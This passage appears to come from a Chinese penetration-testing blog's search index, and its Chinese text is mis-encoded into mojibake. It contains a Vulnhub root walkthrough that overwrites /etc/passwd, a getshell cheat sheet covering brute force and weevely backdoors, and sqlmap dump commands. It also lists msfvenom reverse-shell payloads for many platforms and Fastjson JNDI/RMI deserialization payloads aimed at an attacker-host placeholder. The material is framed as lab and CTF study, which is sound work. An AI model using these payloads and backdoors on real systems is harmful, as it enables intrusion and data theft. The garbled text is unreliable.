\n\n\nB)ä½¿ç”¨msfæœç´¢expï¼šä½¿ç”¨expéœ€è¦å…ˆè·å¾—ä¸€ä¸ªsessionï¼Œé‡æ–°ç”¨msfç›‘å¬443ï¼Œè·å–shellåï¼Œbackgroundè¿”å›ä¸Šä¸€å±‚ï¼ŒæˆåŠŸè·å¾—ä¸€ä¸ªsessionï¼šä½¿ç”¨chkrootkitçš„expï¼šææƒæˆåŠŸï¼Œæ‹¿flagï¼š  \n\n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulnhub","ææƒ","Metasoploit","åå¼¹shell","Msfvenom","http-methods"]},{"title":"getshell","url":"/75811fbe.html","content":"è·å–shell\n1.çˆ†ç ´\nä¼˜å…ˆä½¿ç”¨æ¡ä»¶ï¼šè·å¾—æœ‰é™çš„è´¦æˆ·æ± ä¸å¯†ç æ± nmap -p 22 --script=ssh-brute --script-args userdb=&lt;è´¦æˆ·æ± .txt&gt;,passdb=&lt;å¯†ç æ± .txt&gt; &lt;é¶æœºip&gt;ä½¿ç”¨å®ä¾‹ï¼šVulnhub|Me and My Girlfriend\n\n2.åˆ©ç”¨exp\nä¼˜å…ˆä½¿ç”¨æ¡ä»¶ï¼šè·å¾—ä½¿ç”¨å†…å®¹çš„ç‰ˆæœ¬ä¿¡æ¯ï¼ˆaï¼‰ç›´æ¥ä½¿ç”¨searchsploit  searchsploit &lt;å†…å®¹ä¿¡æ¯&gt;ï¼ˆbï¼‰é€šè¿‡metasoploit  search &lt;å†…å®¹ä¿¡æ¯&gt;ä½¿ç”¨å®ä¾‹ï¼šVulnhub|SickOs1.2  \n\n3.åå¼¹shell\nä¼˜å…ˆä½¿ç”¨æ¡ä»¶ï¼š3.1 æœ‰å¡«å…¥å¹¶ç”Ÿæ•ˆphp/jspä»£ç çš„äº¤äº’msfvenomç”Ÿæˆåå¼¹shellä»£ç +å¡«å…¥+metasploitç›‘å¬ä½¿ç”¨å®ä¾‹ï¼šVulnhub|Os-Hax  \n\nmsfvenomç”Ÿæˆåå¼¹shellä»£ç  è¯¦è§Tools-Msfvenom åå¼¹shell  \n\n3.2 èƒ½å¤ŸPUT/ä¸Šä¼ ä»£ç ï¼ˆaï¼‰msfvenomç”Ÿæˆåå¼¹shellä»£ç +PUT/ä¸Šä¼ +metasploitç›‘å¬ï¼ˆbï¼‰ä¸€å¥è¯æœ¨é©¬+èšå‰‘+kailè‡ªå¸¦åå¼¹shellä»£ç (/usr/share/webshells/~)ä½¿ç”¨å®ä¾‹ï¼šVulnhub|SickOs1.2ï¼ˆcï¼‰weevelyç”Ÿæˆåé—¨ä»£ç +PUT/ä¸Šä¼ +weevelyè¿æ¥åé—¨ç”Ÿæˆåé—¨ weevely generate &lt;password&gt; &lt;path&gt;è¿æ¥åé—¨ weevely &lt;URL&gt; &lt;password&gt; [cmd]ä½¿ç”¨å®ä¾‹ï¼šVulnhub|JIS-CTF-VulnUpload-CTF01  \n\n\nå‡çº§äº¤äº’å¼shell\n\npython\n\n\nsudo  python -c 'import pty;pty.spawn(\"/bin/sh\")'  //python&lt;3\npython3 -c 'import pty;pty.spawn(\"/bin/sh\")'\n\n\n\n\nå¾…ç»­\n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["getshell"]},{"title":"Vulnhub|Os-hackNos","url":"/a8b692c1.html","content":"0.é¶æœºå®‰è£…\nä½¿ç”¨NATæ¨¡å¼ï¼Œä¿è¯ä¸æ”»å‡»æœºkaliåœ¨åŒä¸€ç½‘æ®µå†…ã€‚\n\nè¿™é‡Œé…ç½®å®Œäº†ä¹‹åå‘ç°nmapä¸åˆ°é¶æœºçš„ipã€‚\nè§£å†³åŠæ³•ï¼š\n1.å¯åŠ¨é¶æœºæ—¶æŒ‰shiftï¼Œè¿›å…¥é…ç½®ç•Œé¢ï¼Œä¿®æ”¹é…ç½®ä¿¡æ¯ï¼š2.ip aæŸ¥çœ‹ç½‘å¡ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°é¶æœºæ²¡æœ‰æˆåŠŸåœ°è¢«åˆ†é…åˆ°ipï¼Œè®°ä½ç½‘å¡åç§°ens33ï¼š3.vim /etc/network/interfacesçœ‹ä¸€ä¸‹é…ç½®ä¿¡æ¯ç”¨çš„æ˜¯å“ªä¸€ä¸ªç½‘å¡ï¼ŒæŠŠå®ƒä»¬éƒ½æ”¹ä¸ºens33ï¼š/etc/init.d/networking restarté‡å¯ç½‘å¡åï¼Œé‡æ–°å¯åŠ¨é¶æœºã€‚\n\næ­¤æ—¶é¶æœºå¯åŠ¨åï¼Œåœ¨æ”»å‡»æœºä¸Šè¿›è¡Œä¸»æœºæ‰«ææ—¶åº”èƒ½æ‰«æåˆ°ã€‚\n\n\n1.ä¿¡æ¯æ”¶é›†\nä¸»æœºæ‰«ænmapæ‰«ænmap -sn 192.168.xxx.0/24é¶æœºå¼€æ”¾äº†22(ssh)å’Œ80(http)ç«¯å£ã€‚  \n\n2.(80ç«¯å£)webå®‰å…¨\nwebè®¿é—®ï¼ŒæŸ¥çœ‹æºä»£ç æ˜¯ä¸€ä¸ªapache2çš„é»˜è®¤é¡µé¢ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆã€‚dirbæ‰«æwebç›®å½•dirb http://192.168.xxx.xxx :è®¿é—®http://192.168.117.134/drupal :è¯¥ç›®å½•æ˜¯ä¸€ä¸ªå†…å®¹ç®¡ç†ç³»ç»Ÿã€‚è®¿é—®http://192.168.117.134/drupal/robots.txt :æŸ¥çœ‹æ–‡ä»¶CHANGELOG.txtï¼Œè·å¾—ç‰ˆæœ¬ä¿¡æ¯ï¼š  \n\n3.getshell(msf)\né€šè¿‡metasoploitæœç´¢expsearch drupalï¼šç”±äºæ”»å‡»ç›®æ ‡ä¸åœ¨æ ¹ç›®å½•ä¸‹ï¼Œæ•…éœ€è®¾ç½®targeturiåˆ°å¯¹åº”ç›®å½•/drupalï¼šè·å–shellï¼šå°†å…¶è½¬æ¢æˆäº¤äº’å¼çš„shellï¼Œå…ˆæŸ¥çœ‹ä½¿ç”¨pythonç‰ˆæœ¬ï¼špython&gt;3ä½¿ç”¨python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;ï¼šls -aæŸ¥çœ‹ /var/www/html ä¸‹çš„æ–‡ä»¶åŠæ–‡ä»¶å¤¹ï¼šæŸ¥çœ‹å¯ç–‘æ–‡ä»¶alexander.txtï¼šçœ‹ä¸Šå»ç»è¿‡base64åŠ å¯†ï¼Œä¸¢åˆ°ç½‘ä¸Šè§£ç å™¨å»è§£ç ï¼šè§£ç åçš„å†…å®¹è¿˜æ˜¯ä¸€æ®µåŠ å¯†å†…å®¹ï¼ŒæŸ¥äº†ä¸€ä¸‹å‘ç°åƒæ˜¯ç»è¿‡brainfuckåŠ å¯†åçš„å¯†æ–‡ï¼Œç»§ç»­è§£ç ï¼šå¾—åˆ°ä¸€ä¸ªç”¨æˆ·åå’Œå¯†ç james:Hacker@4514ï¼Œå°è¯•ç›´æ¥su &lt;ç”¨æˆ·å&gt;åˆ‡æ¢ç™»å½•ï¼šç™»é™†å¤±è´¥ï¼Œè¯´æ˜è¿™å¥—è´¦æˆ·å¯†ç è¦ä¹ˆæ˜¯é—¹ä½ ç©å„¿ï¼Œè¦ä¹ˆæ˜¯æ²¡æœ‰ç™»é™†æƒé™ã€‚cat /etc/passwd æŸ¥çœ‹ç”¨æˆ·ï¼Œå‘ç°æ˜¯æœ‰jamesçš„ï¼Œè¿›å…¥ä»–çš„å·¥ä½œç›®å½•/home/jamesçœ‹ä¸€ä¸‹ï¼ŒæŸ¥çœ‹å¯ç–‘æ–‡ä»¶user.txt:æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag.txt    \n\n4. ææƒ\n\n2021-12-01å‘å¸ƒçš„ææƒç›¸å…³æ–‡ç« ææƒ  \n\nå°è¯•sudoææƒï¼Œå› ä¸çŸ¥é“å½“å‰ç”¨æˆ·çš„å¯†ç æ•…ä¸å¯è¡Œï¼šå°è¯•suidææƒfind / -perm -u=s -type f 2&gt;/dev/null:åˆ©ç”¨wgetï¼šç”¨python3åœ¨é¶æœºé‡Œæ­å»ºä¸€ä¸ªå»ºè®®æœåŠ¡å™¨python3 -m http.server 8888(æˆ‘è¿™é‡Œå…ˆåˆ‡æ¢åˆ° /etc æ˜¯ä¸ºäº†ä¸€ä¼šè·å–æ–‡ä»¶æ—¶å€™çœå¾—è¾“å…¥è·¯å¾„ï¼Œå°±ç›´æ¥åˆ‡æ¢åˆ°æ–‡ä»¶æ‰€åœ¨è·¯å¾„ä¸‹äº†)é€šè¿‡æ”»å‡»æœºå°†é¶æœºé‡Œçš„passwdæ–‡ä»¶é€šè¿‡wgetä¸‹è½½å‡ºæ¥(ä¸Šä¸€æ­¥å¦‚æœæ²¡æœ‰åˆ‡æ¢åˆ°/etcå»æ­å»ºæœåŠ¡å™¨çš„è¯ï¼Œå°±è¦è¾“å…¥å®Œæ•´çš„æ–‡ä»¶æ‰€åœ¨è·¯å¾„)wget http://192.168.117.134:8888/passwdåœ¨æ”»å‡»æœºä¸Šåˆ›å»ºä¸€ä¸ªæœ¬åœ°åŠ å¯†ç”¨æˆ·ï¼šopenssl passwd -l -salt cyytest 123456\n\næ³¨æ„æ­¤å¤„çš„ç”¨æˆ·åå¿…éœ€â‰¥5ï¼Œå¦åˆ™ä¼šå¤±è´¥æ°”æ­»  \n\nå°†åˆšåˆ›å»ºçš„åŠ å¯†çš„æœ¬åœ°ç”¨æˆ·æ·»åŠ åˆ°passwdä¸­ï¼š&lt;ç”¨æˆ·å&gt;:&lt;åŠ å¯†åçš„å†…å®¹&gt;0:0:0::/root:/bin/bashåŒæ ·åœ¨æ”»å‡»æœºä¸Šæ­å»ºä¸€ä¸ªæœåŠ¡å™¨ï¼šåœ¨é¶æœºä¸Šå°†æ”»å‡»æœºä¸Šçš„passwdæ–‡ä»¶é€šè¿‡wgetä¸‹è½½å¹¶è¦†ç›–åŸæœ‰çš„passwd:é€šè¿‡è´¦æˆ·å¯†ç  cyytest:123456 ç™»å½•ï¼ŒæˆåŠŸè·å–rootæƒé™ï¼šæŸ¥çœ‹root.txtï¼Œæ‹¿åˆ°ç¬¬äºŒä¸ªflag:    \n\n","categories":["æ¸—é€æµ‹è¯•"],"tags":["Vulnhub","ææƒ","Metasoploit"]},{"title":"Tools","url":"/2b3bf173.html","content":"nmap\nå¸¸ç”¨-Aä¾æ¬¡æ‰«æåŒ…å«ç³»ç»Ÿæ¢æµ‹ã€ç‰ˆæœ¬æ¢æµ‹ã€è„šæœ¬æ‰«æå’Œè·Ÿè¸ªæ‰«æã€‚-p-å…¨ç«¯å£æ‰«æã€‚-påªæ‰«ææŒ‡å®šçš„ç«¯å£ã€‚-hè¾“å‡ºå¸®åŠ©ä¿¡æ¯ã€‚-Pnå°†æ‰€æœ‰ä¸»æœºéƒ½é»˜è®¤ä¸ºåœ¨çº¿ï¼Œè·³è¿‡ä¸»æœºå‘ç°ã€‚-iflistæŸ¥çœ‹æœ¬åœ°è·¯ç”±ä¸æ¥å£ã€‚  \nç›®æ ‡è¯´æ˜-iLä»å·²æœ‰ipåˆ—è¡¨æ–‡ä»¶ä¸­è¯»å–å¹¶æ‰«æã€‚-iR+éšæœºé€‰æ‹©ç›®æ ‡è¿›è¡Œæ‰«æã€‚--exclude+ipæ’é™¤æ­¤ipã€‚  \nä¸»æœºå‘ç°-sLåˆ—å‡ºè¦æ‰«æçš„ipã€‚-snä¸è¿›è¡Œç«¯å£æ‰«æã€‚-Pnå«æ‰€æœ‰çš„ä¸»æœºéƒ½é»˜è®¤ä¸ºåœ¨çº¿ï¼Œè·³è¿‡ä¸»æœºå‘ç°ã€‚ï¼ˆå…¨é¢ã€è¾ƒæ…¢ï¼‰-PS/PA/PU/PYä½¿ç”¨TCPã€SYN/ACKã€UDPæˆ–SCTPåè®®å»å‘ç°ç«¯å£ã€‚-PE/PP/PMä½¿ç”¨ICMPå“åº”ï¼ˆechoï¼‰ã€æ—¶é—´æˆ³æˆ–å­ç½‘æ©ç è¯·æ±‚æ¥å‘ç°æ¢æµ‹ã€‚-POä½¿ç”¨IPåè®®çš„pingã€‚-nä¸åšDNSè§£æã€‚-Ræ€»æ˜¯åšDNSåå‘è§£æã€‚--dns-serversæŒ‡å®šè‡ªå®šä¹‰çš„DNSæœåŠ¡å™¨ã€‚--system-dnsä½¿ç”¨æ“ä½œç³»ç»Ÿçš„DNSã€‚--tracerouteè¿½è¸ªæ¯å°ä¸»æœºçš„è·³è½¬è·¯å¾„ã€‚  \næ‰«ææŠ€æœ¯-sS/sT/sA/sW/sMä½¿ç”¨SYNã€TCPã€å…¨è¿æ¥Connect()ã€ACKã€Windowã€Maimonæ¥è¿›è¡Œæ‰«æã€‚-sUUDPæ‰«æã€‚-sN/sF/sXä½¿ç”¨TCP Null(æ— flag)ã€FINã€Xmasï¼ˆFIN+Push+Urgentï¼‰æ‰«æã€‚--scanflags +flagsè‡ªå®šä¹‰TCPæ‰«æçš„flagsã€‚-sIåƒµå°¸æœºæ‰«æã€‚-sY/sZä½¿ç”¨SCTPåè®®çš„INIT/COOKIE-ECHOæ‰«æã€‚-sOè¿›è¡ŒIPåè®®æ‰«æã€‚-b &lt;FTP relay host&gt;æŒ‡å®šFTPä¸­ç»§ä¸»æœºè¿›è¡ŒFTPåå¼¹æ‰«æã€‚--send-ethæˆ–--send-ipä½¿ç”¨åŸå§‹ä»¥å¤ªå¸§æˆ–IPæ•°æ®åŒ…å‘é€ã€‚  \nç«¯å£è¯´æ˜å’Œæ‰«æè§„åˆ™-p-å…¨ç«¯å£æ‰«æã€‚-påªæ‰«ææŒ‡å®šçš„ç«¯å£ã€‚--exclude-portsä¸å¯¹æ­¤ç«¯å£è¿›è¡Œæ‰«æã€‚-Få¿«é€Ÿæ¨¡å¼ï¼Œæ‰«ææ¯”é»˜è®¤ç«¯å£æ•°é‡æ›´å°‘çš„ç«¯å£ã€‚-ræœ‰åºåœ°æ‰«æç«¯å£è€Œä¸æ˜¯éšæœºåœ°æ‰«æã€‚--top-ports &lt;number&gt;æ‰«ææ’åæŒ‡å®šçš„æ•°å­—å‰å‡ ä½çš„æœ€å¸¸ç”¨çš„ç«¯å£ã€‚--port-ratio &lt;ratio&gt;æ‰«ææ¯”è¾“å…¥çš„æ¯”ä¾‹æ›´å¸¸ç”¨çš„ç«¯å£ã€‚  \næœåŠ¡ã€ç‰ˆæœ¬æ¢æµ‹-sVæ¢æµ‹å¼€å¯çš„ç«¯å£æ¥è·å–æœåŠ¡ã€ç‰ˆæœ¬ä¿¡æ¯ã€‚-Vè¾“å‡ºç‰ˆæœ¬å·ã€‚--version-intensity &lt;level&gt;è®¾ç½®æ¢æµ‹æœåŠ¡ã€ç‰ˆæœ¬ä¿¡æ¯çš„å¼ºåº¦ã€‚--version-lightå¼ºåº¦ä¸º2çš„æ¢æµ‹å¼ºåº¦ã€‚--version-allå¼ºåº¦ä¸º9çš„æ¢æµ‹å¼ºåº¦ã€‚--version-traceå°†æ‰«æçš„å…·ä½“è¿‡ç¨‹æ˜¾ç¤ºå‡ºæ¥ã€‚  \nè„šæœ¬æ‰«æ-sCç­‰åŒäº--script=defaultã€‚--script=&lt;Lua scripts&gt;æŒ‡å®šä½¿ç”¨Luaè„šæœ¬è¿›è¡Œæ‰«æã€‚--script-args=&lt;n1=v1,[n2=v2,...]&gt;æŒ‡å®šè„šæœ¬çš„å‚æ•°ã€‚--script-args-file=filenameæŒ‡å®šæä¾›è„šæœ¬å‚æ•°çš„æ–‡ä»¶ã€‚--script-traceæ˜¾ç¤ºå…¨éƒ¨å‘é€å’Œæ”¶åˆ°çš„æ•°æ®ã€‚--script-updatedbæ›´æ–°è„šæœ¬çš„æ•°æ®åº“ã€‚--script-help=&lt;Lua script&gt;æ˜¾ç¤ºè„šæœ¬çš„ç›¸å…³ä¿¡æ¯ã€‚  \né˜²ç«å¢™ã€IDSç»•è¿‡å’Œæ¬ºéª—--proxies &lt;url1,[url2],...&gt;æŒ‡å®šä»£ç†æœåŠ¡å™¨è¿›è¡Œæ‰«æã€‚--privilegedå‡è®¾ç”¨æˆ·æœ‰å…¨éƒ¨æƒé™ã€‚--unprivilegedå‡è®¾ç”¨æˆ·ç¼ºå°‘åŸå§‹å¥—æ¥å­—æƒé™ã€‚-f;--mtu &lt;val&gt;è®¾ç½®MTUæœ€å¤§ä¼ è¾“å•å…ƒã€‚-D &lt;è¯±é¥µip1,è¯±é¥µip2,...&gt;&lt;ç›®æ ‡ip&gt;æˆ–-D &lt;RND:number&gt;&lt;ç›®æ ‡ip&gt;æŒ‡å®šå¤šä¸ªè¯±é¥µIPæˆ–è€…ä½¿ç”¨RNDéšæœºç”Ÿæˆnumberä¸ªè¯±é¥µIPï¼Œå¯¹ç›®æ ‡ä¸»æœºè¿›è¡ŒIPæ¬ºéª—ã€‚-S &lt;ip&gt;ä¼ªé€ æºåœ°å€ã€‚-e &lt;iface&gt;ä½¿ç”¨æŒ‡å®šçš„æ¥å£ã€‚-gæˆ–--source-port &lt;portnum&gt;ä½¿ç”¨æŒ‡å®šçš„æºç«¯å£ã€‚--data &lt;hex string&gt;åœ¨å‘é€åŒ…çš„æ•°æ®å­—æ®µä¸­è¿½åŠ è‡ªå®šä¹‰çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚--data-string &lt;string&gt;åœ¨å‘é€æŠ¥çš„æ•°æ®å­—æ®µä¸­è¿½åŠ è‡ªå®šä¹‰çš„ASCIIå­—ç¬¦ä¸²ã€‚--data-length &lt;num&gt;åœ¨å‘é€æŠ¥çš„æ•°æ®å­—æ®µä¸­è¿½åŠ éšæœºçš„æ•°æ®ã€‚--ip-options &lt;options&gt;ä½¿ç”¨æŒ‡å®šçš„IPé€‰é¡¹å‘é€åŒ…ã€‚ttl &lt;val&gt;è®¾ç½®TTLå€¼ã€‚--spoof-mac &lt;mac address/prefix/vendor name&gt;ä¼ªé€ æºMACåœ°å€ã€‚--badsumå‘é€ä¼ªé€ TCP/UDP/SCTPæ ¡éªŒå’ŒChecksumçš„æ•°æ®åŒ…ã€‚  \n\nSQLMAP\nçˆ†æ•°æ®åº“åsqlmap -r E:\\Brup_cap\\1.txt --dbs --batchsqlmap -u &lt;url&gt; --cookie=&quot;PHPSESSID=dwqedewfqfrfq;security=low&quot; --dbs //cookieä¸ºæ³¨å…¥ç‚¹  \nçˆ†è¡¨åsqlmap -r 1.txt -D &lt;database_name&gt; --tables --batch  \nçˆ†å­—æ®µåsqlmap -r 1.txt -D &lt;database_name&gt; -T &lt;table_name&gt; --columns --batch  \nå­—æ®µå†…å®¹sqlmap -r 1.txt -D &lt;database_name&gt; -T &lt;table_name&gt; -C &lt;column1,column2â€¦&gt; --dump --batch  \nè¯•æ¢WAFsqlmap -u &lt;url&gt; --identify-waf --batch  \ntamperè„šæœ¬sqlmap -u &lt;url&gt; --tamper &lt;æ¨¡å—å&gt;è„šæœ¬ä½ç½®ï¼š~/sqlmap/tamper  \n\nMsfvenom åå¼¹shell\nPayLoads ListBinaries Payloads\n#[Linux]  \nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f elf -o shell.elf   \n#[Windows]  \nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f exe -o shell.exe  \n#[Mac]  \nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f macho -o shell.macho  \n\nWeb Payloads\n#[PHP->.php]  \nmsfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -o shell.php  \n#[JAVA->.jar]  \nmsfvenom -p java/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f jar -o shell.jar  \n#[ASP->.asp]  \nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f asp -o shell.asp  \n#[JSP->.jsp]  \nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -o shell.jsp  \n#[JSP->.war]  \nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f war -o shell.war  \n\nScripting Payloads\n#[Python]  \nmsfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw -o shell.py  \n#[Bash]  \nmsfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw -o shell.sh  \n#[Perl]  \nmsfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f raw -o shell.pl  \n\nShellCode Payloads\n#[Linux Based Shellcode]  \nmsfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f &lt;language>  \n#[Windows Based Shellcode]  \nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f &lt;language>  \n#[Mac Based Shellcode]  \nmsfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address> LPORT=&lt;Your Port to Connect On> -f &lt;language>  \n\nç›‘å¬-getshell\nmsfconsole  \nuse exploit/multi/handler  \nset payload &lt;payload>  \nset lhost &lt;Your IP Address>  \nset lport &lt;Your Port to Connect On>  \nrun  \nè¿™é‡Œçš„è§¦å‘æ¡ä»¶è¦æ˜¯å®é™…æƒ…å†µè€Œå®šï¼Œæœ‰çš„æ˜¯ç›´æ¥è®¿é—®å¯¹åº”é¡µé¢ï¼Œæœ‰çš„æ˜¯ç›´æ¥åœ¨å‰ç«¯å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œæ“ä½œè€Œè§¦å‘ã€‚  \n\n\nèšå‰‘\næ•°æ®ç®¡ç†-å³é”®-æ·»åŠ æ•°æ®  \n\n[URL]è¦å¡«åˆ°.phpç›®å½•ã€‚\n[è¿æ¥å¯†ç ]ä¸º[â€œâ€]å†…éƒ¨çš„å‚æ•°ã€‚  \n\n\nweevely\nç”Ÿæˆåé—¨weevely generate &lt;password&gt; &lt;file&gt;  \nè¿æ¥åé—¨weevely &lt;url&gt; &lt;password&gt; [cmd]  \n[cmd]\n\n\næ¨¡å—å\næ³¨é‡Š\næ¨¡å—å\næ³¨é‡Š\n\n\n\n\n:shell_su\né€šè¿‡æ›´å˜ä½¿ç”¨è€…æ¥æ‰§è¡Œshellå‘½ä»¤ï¼Œå¯ä»¥è·å¾—rootæƒé™æ¥æ‰§è¡Œå‘½ä»¤\n:bruteforce_sql\nå¯ç”¨æ¥çŒœè§£æ•°æ®åº“å¯†ç \n\n\n:shell_sh\næ‰§è¡Œ shell å‘½ä»¤\n:file_find\næŸ¥æ‰¾å…·æœ‰ç»™å®šåç§°å’Œå±æ€§çš„æ–‡ä»¶\n\n\n:shell_php\næ‰§è¡Œ PHP å‘½ä»¤\n:file_download\nä»è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿä¸‹è½½æ–‡ä»¶\n\n\n:system_extensions\næ”¶é›†PHPå’Œwebserveræ‰©å±•åˆ—è¡¨\n:file_check\nè·å–æ–‡ä»¶çš„å±æ€§å’Œæƒé™\n\n\n:system_info\næ”¶é›†ç³»ç»Ÿä¿¡æ¯\n:file_touch\næ›´æ”¹æ–‡ä»¶æ—¶é—´æˆ³\n\n\n:system_procs\nåˆ—å‡ºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹\n:file_cd\næ›´æ”¹å½“å‰å·¥ä½œç›®å½•\n\n\n:audit_disablefunctionbypass\nä½¿ç”¨mod_cgiå’Œ.htaccessç»•è¿‡ç³»ç»Ÿç¦ç”¨å‡½æ•°çš„é™åˆ¶\n:file_grep\næ‰“å°ä¸å¤šä¸ªæ–‡ä»¶ä¸­çš„æ¨¡å¼åŒ¹é…çš„è¡Œ\n\n\n:audit_etcpasswd\næŸ¥çœ‹/etc/passwdæ–‡ä»¶\n:file_gzip\nå‹ç¼©æˆ–è§£å‹gzipæ–‡ä»¶\n\n\n:audit_suidsgid\næŸ¥æ‰¾å¸¦æœ‰SUIDæˆ–SGIDæ ‡å¿—çš„æ–‡ä»¶\n:file_tar\nå‹ç¼©æˆ–è§£å‹taræ–‡ä»¶\n\n\n:audit_phpconf\næŸ¥çœ‹phpé…ç½®ä¿¡æ¯\n:file_enum\næ£€æŸ¥è·¯å¾„åˆ—è¡¨çš„å­˜åœ¨å’Œæƒé™\n\n\n:audit_filesystem\nå®¡æ ¸æ–‡ä»¶ç³»ç»Ÿçš„å¼±æƒé™(æ‰¾777æƒé™)\n:file_cp\nå¤åˆ¶å•ä¸ªæ–‡ä»¶\n\n\n:backdoor_reversetcp\næ‰§è¡Œåå‘TCP shell.éœ€è¦nc -lvp ç›‘å¬\n:file_mount\nä½¿ç”¨HTTPfsæŒ‚è½½è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿ\n\n\n:backdoor_tcp\nåœ¨TCPç«¯å£ä¸Šç”Ÿæˆshell\n:file_clearlog\nä»æ–‡ä»¶ä¸­åˆ é™¤å­—ç¬¦ä¸²\n\n\n:net_scan\nTCPç«¯å£æ‰«æ\n:file_zip\nå‹ç¼©æˆ–è§£å‹zipæ–‡ä»¶\n\n\n:net_mail\nå‘é€é‚®ä»¶\n:file_upload\næ–‡ä»¶ä¸Šè½½åˆ°è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿ\n\n\n:net_ifconfig\nè·å–ç½‘ç»œæ¥å£åœ°å€\n:file_upload2web\nè‡ªåŠ¨å°†æ–‡ä»¶ä¸Šä¼ åˆ°Webæ–‡ä»¶å¤¹å¹¶è·å–ç›¸åº”çš„URL\n\n\n:net_curl\næ‰§è¡Œç±»ä¼¼curlçš„HTTPè¯·æ±‚\n:file_edit\nåœ¨æœ¬åœ°ç¼–è¾‘å™¨ä¸Šç¼–è¾‘è¿œç¨‹æ–‡ä»¶\n\n\n:net_proxy\nè¿è¡Œæœ¬åœ°ä»£ç†ä»¥é€šè¿‡ç›®æ ‡è½¬ç§»HTTP/HTTPSæµè§ˆ\n:file_read\nä»è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿä¸­è¯»å–è¿œç¨‹æ–‡ä»¶\n\n\n:net_phpproxy\nåœ¨ç›®æ ‡ä¸Šå®‰è£…PHPä»£ç†\n:file_webdownload\næŒ‡å®šURLä¸‹è½½æ–‡ä»¶\n\n\n:file_ls\nåˆ—å‡ºç›®å½•å†…å®¹\n:file_rm\nåˆ é™¤è¿œç¨‹æ–‡ä»¶\n\n\n:sql_dump\nMulti dbms mysqldump replacement\n:sql_console\næ‰§è¡ŒSQLæŸ¥è¯¢æˆ–è¿è¡Œsqlæ§åˆ¶å°\n\n\n\n\nmarshalsecï¼ˆjavaååºåˆ—åŒ–å·¥å…·ï¼‰Fastjsonååºåˆ—åŒ–ä»£ç \n// javac TouchFile.java\nimport java.lang.Runtime;\nimport java.lang.Process;\n\npublic class TouchFile &#123;\n   static &#123;\n       try &#123;\n           Runtime rt = Runtime.getRuntime();\n           String[] commands = &#123;\"touch\", \"/tmp/success\"&#125;;\n           Process pc = rt.exec(commands);\n           pc.waitFor();\n       &#125; catch (Exception e) &#123;\n           // do nothing\n       &#125;\n   &#125;\n&#125;\né€šè¿‡ javac TouchFile.java å°† .javaä»£ç  ç¼–è¯‘æˆ .classç±»ï¼Œå¹¶åœ¨ç±»æ‰€åœ¨æ–‡ä»¶å¤¹æ­å»ºhttpæœåŠ¡ python3 -m http.server &lt;httpç«¯å£&gt; æˆ– python -m SimpleHTTPServer &lt;httpç«¯å£&gt; ã€‚  \n\nå¼€å¯RMIæœåŠ¡\nåœ¨marshalsecç›®å½•ï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œå¼€å¯RMIæœåŠ¡ï¼Œæ˜ å°„&lt;httpç«¯å£&gt;ä¸º&lt;rmiæœåŠ¡ç›‘å¬ç«¯å£&gt;ï¼Œå¹¶åˆ¶å®šåŠ è½½è¿œç¨‹ç±» &lt;ç±»å&gt;.classjava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://&lt;æ”»å‡»æœºip>:&lt;httpç«¯å£>/#&lt;ç±»å>\" &lt;rmiæœåŠ¡ç›‘å¬ç«¯å£>  \n\nPOST jsonå¯¹è±¡\næ„å»ºPayloadï¼Œå°†è‡ªå®šä¹‰jsonå¯¹è±¡POSTè‡³ç›®æ ‡æœåŠ¡å™¨// Fastjson &lt;= 1.2.24  \n&#123;\n   \"b\":&#123;\n       \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n       \"dataSourceName\":\"rmi://&lt;æ”»å‡»æœºip>:&lt;rmiæœåŠ¡ç›‘å¬ç«¯å£>/&lt;ç±»å>\",\n       \"autoCommit\":true\n   &#125;\n&#125;\n// Fastjson &lt;= 1.2.47\n&#123;\n   \"a\":&#123;\n       \"@type\":\"java.lang.Class\",\n       \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n   &#125;,\n   \"b\":&#123;\n       \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n       \"dataSourceName\":\"rmi://&lt;æ”»å‡»æœºip>:&lt;rmiæœåŠ¡ç›‘å¬ç«¯å£>/&lt;ç±»å>\",\n       \"autoCommit\":true\n   &#125;\n&#125;\n\nLog4j2ååºåˆ—åŒ–ä»£ç \n//javac 